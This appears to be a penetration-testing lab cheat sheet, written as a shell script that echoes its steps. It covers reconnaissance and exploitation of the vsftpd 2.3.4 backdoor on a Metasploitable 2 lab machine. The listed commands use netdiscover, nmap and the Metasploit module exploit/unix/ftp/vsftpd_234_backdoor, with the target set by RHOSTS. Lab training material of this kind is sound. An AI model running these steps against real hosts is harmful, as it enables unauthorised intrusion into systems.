echo '
--] METASPLOIT FRAMEWORK 27

OPERATOR   === KALI               IP === 132
CHARLIE    === METASPLOITE 2      IP === 131
TANGO      === WIN 7              IP === 134

OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> netdiscover -r 172.16.14.0/24
OPERATOR    ==> TASK ==> nmap -p- -sV IP_CHARLIE
OPERATOR    ==> TASK ==> cd /usr/share/nmap/scripts/
OPERATOR    ==> TASK ==> nmap --script=ftp-vsftpd-backdoor.nse IP_CHARLIE
OPERATOR    ==> TASK ==> search vsftpd
OPERATOR    ==> TASK ==> use exploit/unix/ftp/vsftpd_234_backdoor
OPERATOR    ==> TASK ==> show options
OPERATOR    ==> TASK ==> set rhosts IP_CHARLIE
OPERATOR    ==> TASK ==> show info


'
read